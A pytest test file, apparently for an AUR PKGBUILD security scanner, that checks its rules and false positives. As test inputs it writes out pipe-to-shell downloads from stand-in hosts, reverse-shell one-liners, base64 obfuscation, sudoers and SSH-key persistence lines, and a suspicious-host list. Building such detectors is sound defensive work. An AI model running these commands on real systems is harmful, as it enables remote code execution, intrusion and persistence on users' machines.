"""Regression tests for false positives, the newer rules, and extra-file scanning."""

from __future__ import annotations

import time

import pytest

from pkginspect.rules import load_rules
from pkginspect.scoring import score_pkgbuild

HEADER = [
    "# Maintainer: Test <test@test.com>",
    "pkgname=foo",
    "pkgver=1.0",
    "pkgrel=1",
    "arch=(x86_64)",
    "license=(MIT)",
]
SUM = "'" + "a" * 64 + "'"


@pytest.fixture
def config():
    return load_rules()


def run(body, config, header=HEADER, **kw):
    return score_pkgbuild(header + body, config=config, **kw)


def rules(result):
    return [f.rule for f in result.findings]


def finding(result, rule):
    return next(f for f in result.findings if f.rule == rule)


# ── false positives ─────────────────────────────────────────────


def test_optdepends_sudo_is_not_a_command(config):
    body = [
        "depends=('pacman>6.1' 'git')",
        "optdepends=(",
        "  'sudo: privilege elevation'",
        "  'doas: privilege elevation'",
        ")",
        'package() { make DESTDIR="$pkgdir" install; }',
    ]
    r = run(body, config)
    assert not r.blocked
    assert "sudo_or_pacman" not in rules(r)


def test_depends_curl_is_not_a_network_fetch(config):
    r = run(["depends=('curl' 'wget')", "build() { make; }"], config)
    assert "network_fetch" not in rules(r)


def test_real_curl_command_is_a_network_fetch(config):
    r = run(["build() {", "  curl -o x https://example.com/x", "}"], config)
    assert finding(r, "network_fetch").evidence[0].line == len(HEADER) + 2


def test_git_clone_is_a_network_fetch(config):
    r = run(["build() { git clone https://example.com/x.git; }"], config)
    assert "network_fetch" in rules(r)


def test_with_curl_configure_flag_is_not_a_fetch(config):
    r = run(["build() { ./configure --with-curl; }"], config)
    assert "network_fetch" not in rules(r)


def test_symlink_target_may_be_absolute(config):
    """vscode: the symlink TARGET is a system path, the destination is in $pkgdir."""
    body = [
        "package() {",
        "  ln -s /usr/share/code/resources/app/LICENSE.rtf \\",
        '    "${pkgdir}/usr/share/licenses/${pkgname}/LICENSE.rtf"',
        "}",
    ]
    r = run(body, config)
    assert not r.blocked
    assert "privilege_escal" not in rules(r)


def test_symlink_destination_outside_is_a_blocker(config):
    r = run(["package() { ln -sf /tmp/x /etc/evil; }"], config)
    assert r.blocked and r.score == 0
    assert any("privileged operation" in f.message for f in r.findings)


@pytest.mark.parametrize(
    "cmd",
    [
        "install -Dm644 foo.conf /etc/foo.conf",
        "install -d /usr/share/foo",
        "install -Dm755 -t /usr/bin foo",
        "install --target-directory=/usr/bin foo",
        "cp foo /usr/bin/foo",
        "mv foo /opt/foo",
        "mkdir -p /etc/foo /tmp/x",
        "rm -rf /usr/lib/foo",
        "touch /var/foo",
        "chmod 644 /etc/foo",
        "chown root:root /etc/foo",
        "sed -i 's/a/b/' /etc/foo.conf",
        "sed --in-place -e 's/a/b/' /etc/foo.conf",
        "echo x | tee /etc/foo",
        "echo x | sudo tee -a /etc/foo",
        "dd if=foo of=/boot/foo",
        "echo x > /etc/foo",
        "echo x >> /usr/foo",
        'cat foo > "/etc/foo"',
        "cp foo /usr/bin/foo 2>/dev/null",
    ],
)
def test_writes_outside_pkgdir_destinations(config, cmd):
    r = run(["package() {", f"  {cmd}", "}"], config)
    assert any(f.message == "Writes outside $pkgdir" for f in r.findings), cmd
    assert r.blocked


@pytest.mark.parametrize(
    "cmd",
    [
        'install -Dm644 foo.conf "$pkgdir/etc/foo.conf"',
        'install -Dm644 -t "${pkgdir}/usr/bin" foo',
        'install -d "$pkgdir"/usr/share/foo "$pkgdir"/etc/foo',
        'cp /usr/share/foo "$pkgdir/usr/share/foo"',
        'mv "$pkgdir/usr/foo" "$pkgdir/opt/foo"',
        'sed -i "s|/usr/bin|/opt|" "$srcdir/Makefile"',
        'chmod 755 "$pkgdir/usr/bin/foo"',
        "make >/dev/null 2>&1",
        "foo 2>&1 | tee /dev/null",
        'make DESTDIR="$pkgdir" PREFIX=/usr install',
        'export GOPATH="$srcdir"/gopath',
        'rm -rf "$srcdir/build" /tmp/foo',
        "ls /etc > $srcdir/list",
    ],
)
def test_pkgdir_destinations_are_fine(config, cmd):
    r = run(["package() {", f"  {cmd}", "}"], config)
    assert not r.blocked, cmd
    assert "privilege_escal" not in rules(r)


def test_writes_outside_applies_outside_package_function(config):
    r = run(["build() {", "  cp x /usr/bin/x", "}"], config)
    assert r.blocked


def test_home_writes_are_flagged_but_not_fatal(config):
    r = run(['package() { cp x ~/.local/bin/x; export HOME="$srcdir"; }'], config)
    assert not r.blocked
    f = finding(r, "privilege_escal")
    assert f.message == "Writes to your home directory"
    assert f.penalty == config.weights["privilege_escal"]


def test_home_assignment_is_not_a_write(config):
    r = run(['build() { export HOME="$srcdir"; HOME=/home/x make; }'], config)
    assert "privilege_escal" not in rules(r)


# SKIP handling


def test_git_package_may_skip_its_git_source(config):
    body = [
        "pkgname=foo-git",
        "source=('git+https://github.com/Jguer/yay.git')",
        "sha256sums=('SKIP')",
    ]
    r = run(body, config, header=HEADER[:1] + HEADER[2:])
    assert "skip_checksum_some" not in rules(r)
    assert "skip_checksum_all" not in rules(r)
    f = finding(r, "vcs_package")
    assert f.penalty == 0 and "latest upstream commit" in f.message
    assert "git_unpinned" not in rules(r)
    assert r.score == 100


def test_unpinned_vcs_in_normal_package_is_flagged(config):
    body = [
        "source=('git+https://github.com/someone/repo.git')",
        "sha256sums=('SKIP')",
    ]
    r = run(body, config)
    f = finding(r, "git_unpinned")
    assert f.penalty == -10 and f.evidence[0].line == len(HEADER) + 1


@pytest.mark.parametrize("pin", ["#commit=abc123", "#tag=v1.0", "#revision=7"])
def test_pinned_vcs_is_fine(config, pin):
    body = [f"source=('git+https://github.com/o/r.git{pin}')", "sha256sums=('SKIP')"]
    r = run(body, config)
    assert "git_unpinned" not in rules(r)


def test_git_url_in_comment_or_text_is_not_a_source(config):
    r = run(
        ["# source=('git+https://github.com/o/r.git')", "build() { make; }"], config
    )
    assert "git_unpinned" not in rules(r)


def test_skip_on_downloaded_file_is_flagged(config):
    body = [
        f"source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')",
        f"sha256sums=({SUM} 'SKIP')",
    ]
    r = run(body, config)
    f = finding(r, "skip_checksum_some")
    assert "SKIP used in checksums for 1 downloaded file(s)" in f.message
    assert f.evidence[0].line == len(HEADER) + 1


def test_skip_on_every_download_is_worse(config):
    body = [
        "source=('https://example.com/a.tar.gz' 'local.patch')",
        f"sha256sums=('SKIP' {SUM})",
    ]
    r = run(body, config)
    assert "skip_checksum_all" in rules(r)


def test_skip_is_fine_for_signatures_and_local_files(config):
    body = [
        "source=('https://example.com/a.tar.gz' 'https://example.com/a.tar.gz.sig'",
        "        'b.asc' 'local.service')",
        f"sha256sums=({SUM} 'SKIP' 'SKIP' 'SKIP')",
    ]
    r = run(body, config)
    assert not any(x.startswith("skip_checksum") for x in rules(r))


def test_skip_pairing_per_arch(config):
    body = [
        "source_x86_64=('https://example.com/a.tar.gz')",
        "source_aarch64=('https://example.com/b.tar.gz')",
        f"sha256sums_x86_64=({SUM})",
        "sha256sums_aarch64=('SKIP')",
    ]
    r = run(body, config)
    assert "skip_checksum_some" in rules(r)  # aarch64 is SKIP, x86_64 is not


def test_indexed_skip_over_http_spotify(config):
    body = [
        "source=('x.deb::http://repo.example.com/x.deb'",
        "        'spotify.sh'",
        "        'Release::http://repo.example.com/Release'",
        "        'Release.sig::http://repo.example.com/Release.gpg'",
        "        'Packages::http://repo.example.com/Packages')",
        f"sha512sums=({SUM} {SUM} {SUM} {SUM} {SUM})",
        "sha512sums[2]='SKIP'",
        "sha512sums[3]='SKIP'",
        "sha512sums[4]='SKIP'",
    ]
    r = run(body, config)
    f = finding(r, "skip_checksum_some")
    assert "2 downloaded file(s)" in f.message  # Release and Packages, not the .sig
    assert "2 unverified source(s)" in finding(r, "insecure_url").message
    assert r.sources == ["repo.example.com (http)"]


def test_brace_expansion_for_signature(config):
    """1password: source=(url/${_tar}{,.sig}) pairs with two checksums."""
    body = [
        "_tar='foo-1.0.tar.gz'",
        "source=(https://downloads.example.com/linux/${CARCH}/${_tar}{,.sig})",
        f"sha256sums=({SUM}",
        "            'SKIP'",
        ")",
    ]
    r = run(body, config)
    assert not any(x.startswith("skip_checksum") for x in rules(r))
    assert r.sources == ["downloads.example.com"]


def test_variable_expansion_and_rename_form(config):
    body = [
        'url="https://github.com/Jguer/yay"',
        'source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")',
        "sha256sums=('SKIP')",
    ]
    r = run(body, config)
    assert "skip_checksum_all" in rules(r)
    assert r.sources == ["github.com/Jguer"]


def test_unpaired_entries_fall_back(config):
    body = [
        "source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')",
        "sha256sums=('SKIP')",
    ]
    r = run(body, config)
    assert "skip_checksum_some" in rules(r)


def test_unpaired_without_skip_is_fine(config):
    body = [
        "source=('https://example.com/a.tar.gz' 'https://example.com/b.tar.gz')",
        f"sha256sums=({SUM})",
    ]
    r = run(body, config)
    assert not any(x.startswith("skip_checksum") for x in rules(r))


def test_missing_checksums_only_without_any_array(config):
    r = run(["source=('https://example.com/a.tar.gz')"], config)
    assert "missing_checksums" in rules(r)
    r = run(["pkgdesc='no sources at all'"], config)
    assert "missing_checksums" not in rules(r)
    r = run(["source=('https://example.com/a.tar.gz')", f"b2sums=({SUM})"], config)
    assert "missing_checksums" not in rules(r)


def test_weak_hash_only_when_nothing_stronger(config):
    src = "source=('https://example.com/a.tar.gz')"
    assert "weak_hash" in rules(run([src, "md5sums=('abc')"], config))
    assert "weak_hash" in rules(run([src, "sha1sums=('abc')"], config))
    mixed = run([src, "md5sums=('abc')", f"sha256sums=({SUM})"], config)
    assert "weak_hash" not in rules(mixed)
    assert "weak_hash" not in rules(run([src, f"sha256sums=({SUM})"], config))


def test_insecure_url_only_when_unverified(config):
    verified = run(
        ["source=('http://example.com/a.tar.gz')", f"sha256sums=({SUM})"], config
    )
    assert "insecure_url" not in rules(verified)
    assert verified.sources == ["example.com (http)"]

    skipped = run(
        ["source=('http://example.com/a.tar.gz')", "sha256sums=('SKIP')"], config
    )
    f = finding(skipped, "insecure_url")
    assert f.penalty == config.weights["insecure_url"]
    assert "1 unverified source(s)" in f.message

    unpinned = run(
        ["source=('git+http://example.com/a.git')", "sha256sums=('SKIP')"], config
    )
    assert "insecure_url" in rules(unpinned)
    pinned = run(
        ["source=('git+http://example.com/a.git#commit=abc')", "sha256sums=('SKIP')"],
        config,
    )
    assert "insecure_url" not in rules(pinned)

    nosums = run(["source=('ftp://example.com/a.tar.gz')"], config)
    assert "insecure_url" in rules(nosums)


def test_insecure_url_scales_with_count(config):
    body = [
        "source=('http://example.com/a' 'http://example.com/b')",
        "sha256sums=('SKIP' 'SKIP')",
    ]
    f = finding(run(body, config), "insecure_url")
    assert f.penalty == 2 * config.weights["insecure_url"]
    assert len(f.evidence) == 1  # both entries are on the same line


def test_url_field_and_comments_are_not_insecure(config):
    body = ["url='http://example.com'", "# http://example.com/x", "build() { make; }"]
    assert "insecure_url" not in rules(run(body, config))


def test_sources_are_deduplicated_in_order(config):
    body = [
        "source=('git+https://github.com/danikpapas/zen.git'",
        "        'https://zen-browser.app/a.tar.gz'",
        "        'https://zen-browser.app/b.tar.gz'",
        "        'https://codeberg.org/me/x/archive/v1.tar.gz'",
        "        'https://git.sr.ht/~user/repo/archive/1.tar.gz'",
        "        'local.sh')",
        f"sha256sums=('SKIP' {SUM} {SUM} {SUM} {SUM} {SUM})",
    ]
    r = run(body, config)
    assert r.sources == [
        "github.com/danikpapas (git)",
        "zen-browser.app",
        "codeberg.org/me",
        "git.sr.ht/~user",
    ]


# eval / exec


def test_find_exec_and_launcher_exec_are_fine(config):
    body = [
        "build() { find . -name '*.so' -exec strip {} +; }",
        "package() {",
        "  printf '%s\\n' '#!/bin/sh' 'exec /opt/app/app \"$@\"' > \"$srcdir/app.sh\"",
        '  exec /opt/app/app "$@"',
        "}",
    ]
    assert "eval_exec" not in rules(run(body, config))


def test_eval_and_sh_c_messages(config):
    r = run(['build() { eval "$x"; bash -c "$y"; }'], config)
    msgs = [f.message for f in r.findings]
    assert "eval detected (review manually)" in msgs
    assert "sh -c / bash -c detected" in msgs


# whitelist blanking cannot hide code


@pytest.mark.parametrize(
    "line",
    [
        "depends=('a' $(curl https://x.example/s | sh))",
        "depends=('a'); curl https://x.example/s | sh",
        'depends=("a $(curl https://x.example/s | sh)")',
        'depends=("a `curl https://x.example/s | sh`")',
        "pkgdesc='fine'; curl https://x.example/s | sh",
        "pkgdesc=x curl https://x.example/s | sh",
        'optdepends=(\n  "a: b"\n  $(curl https://x.example/s | sh)\n)',
        "provides=('a' ; curl https://x.example/s | sh ; )",
        "options=(a & curl https://x.example/s | sh &)",
    ],
)
def test_blanking_cannot_hide_code(config, line):
    r = run(line.split("\n"), config)
    assert "pipe_to_shell" in rules(r), line


def test_trailing_comment_after_array_is_blanked(config):
    r = run(["depends=('a') # needs sudo and curl"], config)
    assert "sudo_or_pacman" not in rules(r) and "network_fetch" not in rules(r)


def test_line_numbers_survive_blanking(config):
    body = ["depends=(", "  'a'", "  'b'", ")", "build() {", "  curl x", "}"]
    r = run(body, config)
    assert finding(r, "network_fetch").evidence[0].line == len(HEADER) + 6


# pure message lines


def test_echo_message_lines_are_ignored(config):
    body = [
        "post() {",
        "  echo \"Execute 'sudo systemctl enable foo' in a terminal.\"",
        "  msg2 'run: curl http://x'",
        "}",
    ]
    r = run(body, config)
    assert not r.blocked
    assert not {"sudo_or_pacman", "persistence", "pipe_to_shell"} & set(rules(r))


def test_echo_with_substitution_is_still_scanned(config):
    r = run(['build() { echo "$(curl https://x.example/s | sh)"; }'], config)
    assert "pipe_to_shell" in rules(r)
    r = run(["build() { echo hi; sudo make install; }"], config)
    assert r.blocked


# ── rules ───────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "line",
    [
        "curl -s https://x.example/s | sh",
        "curl -s https://x.example/s | bash -",
        "wget -qO- https://x.example/s | sudo bash",
        "curl https://x.example/s | env FOO=1 bash",
        "curl https://x.example/s | python3",
        "curl https://x.example/s | python -",
        "curl https://x.example/s | perl",
        "curl https://x.example/s | node",
        "bash <(curl -s https://x.example/s)",
        "source <(curl -s https://x.example/s)",
        ". <(wget -qO- https://x.example/s)",
        'sh -c "$(curl -fsSL https://x.example/s)"',
        'eval "$(curl -s https://x.example/s)"',
    ],
)
def test_pipe_to_shell_forms(config, line):
    r = run(["build() {", f"  {line}", "}"], config)
    f = finding(r, "pipe_to_shell")
    assert "pipe to shell" in f.message.lower()
    assert r.score <= 100 + f.penalty


@pytest.mark.parametrize(
    "line",
    [
        "curl -s https://x.example/v | python -m json.tool",
        "curl -s https://x.example/v | python -c 'import sys'",
        "curl https://x.example/v | perl -pe 's/a/b/'",
        "curl https://x.example/v | sha256sum",
        "curl https://x.example/v | grep sh",
        "curl -o x https://x.example/x",
    ],
)
def test_pipe_to_shell_negatives(config, line):
    r = run(["pkgver() {", f"  {line}", "}"], config)
    assert "pipe_to_shell" not in rules(r)


@pytest.mark.parametrize(
    "line",
    [
        "base64 -d x",
        "base64 --decode x",
        "base64 -D x",
        "base64 -w0 -d x",
        "xxd -r -p x",
        "openssl enc -d -aes-256-cbc -in x",
        "openssl base64 -d -in x",
        "printf '\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48' > f",
        "echo 'QWxhZGRpbjpvcGVuIHNlc2FtZQ' | base64 -d | sh",
    ],
)
def test_obfuscation_forms(config, line):
    r = run(["build() {", f"  {line}", "}"], config)
    assert "obfuscation" in rules(r), line


@pytest.mark.parametrize(
    "line",
    [
        "base64 file > out",
        "base64 -w0 file | curl -d @- https://x.example",
        "printf '\\x41\\x42' > f",
        "xxd file",
    ],
)
def test_obfuscation_negatives(config, line):
    r = run(["build() {", f"  {line}", "}"], config)
    assert "obfuscation" not in rules(r), line


def test_base64_blob(config):
    blob = "aGVsbG8gd29ybGQK" * 8  # 128 chars, mixed case, digits
    assert "obfuscation" in rules(run([f"build() {{ x={blob}; }}"], config))
    hexblob = "0123456789abcdef" * 8
    assert "obfuscation" not in rules(run([f"build() {{ x={hexblob}; }}"], config))
    # checksums in the sources / sums arrays are metadata
    assert "obfuscation" not in rules(run([f"sha512sums=('{hexblob}')"], config))


def test_ld_preload_only(config):
    assert "ld_preload" in rules(run(["build() { LD_PRELOAD=/x.so make; }"], config))
    f = finding(run(["build() { export LD_PRELOAD=/x.so; }"], config), "ld_preload")
    assert f.message == "LD_PRELOAD manipulation"
    assert "ld_preload" not in rules(
        run(["build() { LD_LIBRARY_PATH=. make; }"], config)
    )


@pytest.mark.parametrize(
    "line",
    [
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "exec 5<>/dev/tcp/example.com/80",
        "echo x > /dev/udp/example.com/53",
        "nc -e /bin/sh example.com 4444",
        "ncat example.com 4444 -c bash",
        "netcat -lvp 4444 -e /bin/bash",
        "socat TCP:example.com:4444 EXEC:/bin/sh",
        "socat tcp-connect:x:1 system:sh",
        "sh -i >& /dev/tcp/x/1",
        "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc example.com 1234 > /tmp/f",
        "python3 -c 'import socket,subprocess;s=socket.socket()'",
        "python -c 'import socket,pty;pty.spawn(\"sh\")'",
    ],
)
def test_reverse_shell_forms_block(config, line):
    r = run(["build() {", f"  {line}", "}"], config)
    assert "reverse_shell" in rules(r), line
    assert r.blocked and r.score == 0
    assert any(
        f.message == "Fatal rule: reverse shell (score forced to 0)"
        and f.rule == "blocker"
        for f in r.findings
    )


@pytest.mark.parametrize(
    "line",
    [
        "nc -z example.com 22",
        "python -c 'import socket; print(socket.gethostname())'",
        "socat -V",
        "sh -i",
        "mkfifo pipe",
    ],
)
def test_reverse_shell_negatives(config, line):
    r = run(["build() {", f"  {line}", "}"], config)
    assert "reverse_shell" not in rules(r), line


@pytest.mark.parametrize(
    "line",
    [
        "crontab -l",
        'echo "* * * * * x" > /etc/cron.d/x',
        "cp x /var/spool/cron/root",
        "echo /x.so >> /etc/ld.so.preload",
        "echo key >> ~/.ssh/authorized_keys",
        "echo 'x' >> ~/.bashrc",
        "echo x >> $HOME/.zshrc",
        "cp x ~/.profile",
        "cp x ~/.config/autostart/x.desktop",
        "cp x ~/.config/systemd/user/x.service",
        "echo 'x ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
    ],
)
def test_persistence_forms(config, line):
    r = run(["package() {", f"  {line}", "}"], config)
    assert "persistence" in rules(r), line


@pytest.mark.parametrize(
    "line",
    [
        'install -Dm644 cron "$pkgdir/etc/cron.d/foo"',
        'install -Dm644 rc "${pkgdir}/etc/skel/.bashrc"',
        'rm -r "$pkgdir"/etc/cron.daily/',
        "systemctl daemon-reload",
        "systemctl is-enabled foo",
        'install -Dm644 x.profile "$pkgdir/etc/profile.d/x.sh"',
    ],
)
def test_persistence_negatives(config, line):
    r = run(["package() {", f"  {line}", "}"], config)
    assert "persistence" not in rules(r), line


@pytest.mark.parametrize(
    "url",
    [
        "http://192.168.1.5/x",
        "https://1.2.3.4/x",
        "http://[2001:db8::1]/x",
        "https://pastebin.com/raw/abc",
        "https://ptpb.pw/~x",
        "https://transfer.sh/abc/x",
        "https://bit.ly/abc",
        "https://cdn.discordapp.com/attachments/1/2/x",
        "https://abc.ngrok.io/x",
        "https://foo.trycloudflare.com/x",
        "https://evil.duckdns.org/x",
    ],
)
def test_suspicious_host_in_code_and_sources(config, url):
    r = run(["build() {", f"  curl -s {url} -o x", "}"], config)
    f = finding(r, "suspicious_host")
    assert f.penalty == -25 and f.category == "transport"
    r = run([f"source=('x.tar.gz::{url}')", f"sha256sums=({SUM})"], config)
    f = finding(r, "suspicious_host")
    assert f.evidence[0].line == len(HEADER) + 1


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/a/b",
        "https://notpastebin.com/x",
        "https://pastebin.com.example.org/x",
        "http://127.0.0.1:8080/x",
        "http://localhost/x",
    ],
)
def test_suspicious_host_negatives(config, url):
    r = run(["build() {", f"  curl -s {url} -o x", "}"], config)
    assert "suspicious_host" not in rules(r), url


def test_acroread_style_malware_scores_low(config):
    r = run(["build() {", "  curl -s https://ptpb.pw/~x|bash -&", "}"], config)
    assert {"pipe_to_shell", "suspicious_host"} <= set(rules(r))
    assert r.score <= 50


def test_tmp_usage(config):
    r = run(["build() {", "  cp x /tmp/foo", "}"], config)
    assert finding(r, "tmp_usage").penalty == -5
    assert "tmp_usage" not in rules(
        run(["build() { d=$(mktemp -d /tmp/foo.XXXX); }"], config)
    )
    assert "tmp_usage" not in rules(run(['build() { cd "$srcdir/tmp/x"; }'], config))


def test_sudo_doas_pkexec_su(config):
    for line in [
        "sudo make install",
        "doas make install",
        "pkexec make install",
        "su -c 'make install'",
    ]:
        r = run(["build() {", f"  {line}", "}"], config)
        assert r.blocked, line
        assert any(
            "uses sudo" in f.message.lower() or "sudo/doas" in f.message.lower()
            for f in r.findings
        )
    assert not run(["build() { make pseudo; echo sudoers; }"], config).blocked


def test_pacman_write_flags(config):
    assert run(["build() { pacman -Syu; }"], config).blocked
    assert run(["build() { sudo pacman -S foo; }"], config).blocked
    assert not run(["build() { pacman -Qi foo; pacman -T foo; }"], config).blocked


def test_setuid_variants(config):
    assert "setuid_bit" in rules(run(['package() { chmod g+s "$pkgdir/x"; }'], config))
    assert "setuid_bit" in rules(run(['package() { chmod 4755 "$pkgdir/x"; }'], config))
    assert "setuid_bit" not in rules(
        run(['package() { chmod u-s "$pkgdir/x"; }'], config)
    )
    assert "setuid_bit" not in rules(
        run(['package() { chmod 755 "$pkgdir/x"; }'], config)
    )


# ── other files in the package repo ─────────────────────────────

INSTALL = """\
post_install() {
  echo "Execute 'sudo systemctl enable foo' in a terminal."
  curl -s https://example.com/hello
  chmod g+s /opt/foo/helper
}

post_upgrade() {
  post_install
}
"""


def test_install_script_info_and_rules(config):
    r = run(["install=foo.install"], config, extra_files={"foo.install": INSTALL})
    info = finding(r, "install_script")
    assert info.penalty == 0 and info.category == "privilege"
    assert (
        info.message
        == "Has install script foo.install (runs as root: post_install, post_upgrade)"
    )
    fetch = finding(r, "network_fetch")
    assert fetch.message == "Network fetch in install script (runs as root)"
    ev = fetch.evidence[0]
    assert (ev.file, ev.line, ev.text) == (
        "foo.install",
        3,
        "curl -s https://example.com/hello",
    )
    assert finding(r, "setuid_bit").evidence[0].line == 4
    assert finding(r, "setuid_bit").evidence[0].file == "foo.install"
    # the echo line must not count as persistence or sudo
    assert "persistence" not in rules(r)
    assert not r.blocked


def test_install_script_is_already_root(config):
    install = "post_install() {\n  cp x /etc/foo\n  sudo foo\n  rm -rf /opt/foo\n}\n"
    r = run([], config, extra_files={"foo.install": install})
    assert not r.blocked
    assert "sudo_or_pacman" not in rules(r) and "privilege_escal" not in rules(r)


def test_install_script_dangerous_rules(config):
    install = (
        "post_install() {\n"
        "  curl https://x.example/s | sh\n"
        "  systemctl enable --now foo\n"
        '  eval "$X"\n'
        "  echo cGF5bG9hZA== | base64 -d > /tmp/x\n"
        "  LD_PRELOAD=x foo\n"
        "}\n"
    )
    r = run([], config, extra_files={"foo.install": install})
    assert {
        "pipe_to_shell",
        "persistence_service",
        "eval_exec",
        "obfuscation",
        "ld_preload",
        "tmp_usage",
    } <= set(rules(r))
    assert all(
        f.evidence[0].file == "foo.install"
        for f in r.findings
        if f.rule in {"pipe_to_shell", "persistence_service"}
    )


def test_install_script_reverse_shell_blocks(config):
    install = "post_install() {\n  bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n}\n"
    r = run([], config, extra_files={"foo.install": install})
    assert r.blocked and r.score == 0


def test_install_script_comment_lines_ignored(config):
    install = "# curl x | sh\npost_install() {\n  # eval $x\n  true\n}\n"
    r = run([], config, extra_files={"foo.install": install})
    assert not {"pipe_to_shell", "eval_exec"} & set(rules(r))


def test_pacman_hook(config):
    hook = "[Trigger]\nOperation = Upgrade\n\n[Action]\nWhen = PostTransaction\nExec = /usr/bin/sh -c 'curl https://x.example/s | sh'\n"
    r = run([], config, extra_files={"foo.hook": hook})
    info = finding(r, "pacman_hook")
    assert info.penalty == 0 and "foo.hook" in info.message
    assert info.evidence[0].line == 6
    assert "pipe_to_shell" in rules(r)


def test_aux_script_rules(config):
    files = {
        "foo.sh": "#!/bin/sh\ncurl https://x.example/s | bash\ncrontab -l\neval $x\n",
        "foo.service": "[Service]\nExecStart=/bin/sh -c 'curl http://192.168.0.1/x | sh'\n",
        "run": "#!/bin/bash\nbash -i >& /dev/tcp/x/1 0>&1\n",
    }
    r = run([], config, extra_files=files)
    assert r.blocked  # reverse shell in `run`
    pipe = finding(r, "pipe_to_shell")
    assert {e.file for e in pipe.evidence} == {"foo.sh", "foo.service"}
    assert "persistence" in rules(r)
    # eval and network fetch are not aux rules
    assert "eval_exec" not in rules(r) and "network_fetch" not in rules(r)


def test_patch_only_added_lines(config):
    patch = (
        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
        "-curl https://x.example/s | sh\n"
        " curl https://x.example/ctx | sh\n"
        "+echo hello\n"
    )
    assert "pipe_to_shell" not in rules(
        run([], config, extra_files={"fix.patch": patch})
    )
    patch += "+curl https://x.example/s | sh\n"
    r = run([], config, extra_files={"fix.patch": patch})
    ev = finding(r, "pipe_to_shell").evidence[0]
    assert (ev.file, ev.line, ev.text) == (
        "fix.patch",
        7,
        "+curl https://x.example/s | sh",
    )


def test_uninteresting_files_are_skipped(config):
    evil = "curl https://x.example/s | sh\nsudo foo\n"
    files = {
        ".SRCINFO": evil,
        ".gitignore": evil,
        "key.asc": evil,
        "foo.svg": evil,
        "README.md": evil,
        "notes.txt": evil,
        "LICENSE": evil,
        "aur.env": evil,
        "PKGBUILD": evil,
        "script": evil,  # extensionless without a shebang
    }
    r = run([], config, extra_files=files)
    assert rules(r) == []
    assert r.score == 100


def test_subdirectory_file_names_in_evidence(config):
    r = run(
        [], config, extra_files={"scripts/run.sh": "curl https://x.example/s | sh\n"}
    )
    assert finding(r, "pipe_to_shell").evidence[0].file == "scripts/run.sh"


# ── evidence ────────────────────────────────────────────────────


def test_evidence_text_is_stripped_and_truncated(config):
    long = "x" * 200
    r = run(["build() {", f"    curl https://example.com/{long}", "}"], config)
    ev = finding(r, "network_fetch").evidence[0]
    assert ev.file == "PKGBUILD" and ev.line == len(HEADER) + 2
    assert ev.text.startswith("curl https://example.com/") and len(ev.text) == 120


def test_evidence_is_capped_at_three_lines(config):
    body = ["build() {"] + [f"  curl https://example.com/{i}" for i in range(6)] + ["}"]
    r = run(body, config)
    assert [e.line for e in finding(r, "network_fetch").evidence] == [
        len(HEADER) + 2,
        len(HEADER) + 3,
        len(HEADER) + 4,
    ]


def test_continued_command_evidence_is_first_line(config):
    r = run(["build() {", "  curl -o x \\", "    https://example.com/x", "}"], config)
    assert finding(r, "network_fetch").evidence[0].line == len(HEADER) + 2


def test_blocked_result_still_has_sources(config):
    r = run(
        [
            "source=('https://example.com/a.tar.gz')",
            f"sha256sums=({SUM})",
            "build() { sudo make; }",
        ],
        config,
    )
    assert r.blocked and r.sources == ["example.com"]
    assert any(f.rule == "blocker" for f in r.findings)


# ── backward compatibility of messages (ML branch matches on these) ──


def test_legacy_message_substrings(config):
    body = [
        "source=('https://example.com/a.tar.gz')",
        "build() {",
        "  curl https://x.example/s | sh",
        "  bash -c 'x'",
        "  base64 -d x",
        "  chmod u+s x",
        "}",
    ]
    msgs = " | ".join(f.message.lower() for f in run(body, config).findings)
    for s in (
        "pipe to shell",
        "base64/binary decode",
        "sh -c / bash -c",
        "network fetch in build",
        "setuid/setcap",
        "no checksum array",
    ):
        assert s in msgs, s
    blocked = " | ".join(
        f.message.lower() for f in run(["build() { sudo x; }"], config).findings
    )
    assert "fatal rule: privileged operation" in blocked and "uses sudo" in blocked
    pac = " | ".join(
        f.message.lower() for f in run(["build() { pacman -S x; }"], config).findings
    )
    assert "calls pacman to install/remove packages" in pac
    out = " | ".join(
        f.message.lower() for f in run(["build() { cp x /etc/x; }"], config).findings
    )
    assert "writes outside $pkgdir" in out
    skip = run(["source=('https://e.com/a')", "sha256sums=('SKIP')"], config)
    assert any("skip used in checksums" in f.message.lower() for f in skip.findings)


# ── community ───────────────────────────────────────────────────

DAY = 86400


def test_new_package_age_rules(config):
    now = 1_700_000_000
    meta = {"NumVotes": 100, "Maintainer": "me"}

    def r(days):
        return run(
            ["build() { make; }"],
            config,
            aur_meta={**meta, "FirstSubmitted": now - days * DAY},
            now=now,
        )

    very = finding(r(3), "aur_very_new_package")
    assert very.penalty == -25
    assert very.message == "New package: first submitted 3 days ago (not yet vetted)"
    assert "aur_new_package" not in rules(r(3))  # only the stronger one applies
    assert finding(r(20), "aur_new_package").penalty == -15
    assert "aur_very_new_package" not in rules(r(20))
    assert not {"aur_new_package", "aur_very_new_package"} & set(rules(r(400)))


def test_out_of_date_uses_now(config):
    now = 1_700_000_000
    meta = {"NumVotes": 100, "Maintainer": "me", "OutOfDate": now - 10 * DAY}
    r = run(["build() { make; }"], config, aur_meta=meta, now=now)
    assert "10 days" in finding(r, "aur_out_of_date_recent").message


def test_vote_tiers(config):
    def pen(votes):
        r = run(
            ["build() { make; }"],
            config,
            aur_meta={"NumVotes": votes, "Maintainer": "me", "FirstSubmitted": 1},
        )
        return [f.penalty for f in r.findings if f.category == "community"]

    assert pen(0) == [-15]
    assert pen(1) == [-5] and pen(14) == [-5]
    assert pen(15) == [-2] and pen(29) == [-2]
    assert pen(30) == []


def test_community_cap_is_forty(config):
    assert config.caps["community"] == -40
    meta = {
        "NumVotes": 0,
        "Maintainer": None,
        "OutOfDate": 1,
        "FirstSubmitted": int(time.time()),
    }
    r = run(["build() { make; }"], config, aur_meta=meta)
    assert r.categories["community"] == -40


# ── round 2 ─────────────────────────────────────────────────────


def test_unpaired_skip_with_signature_is_info_only(config):
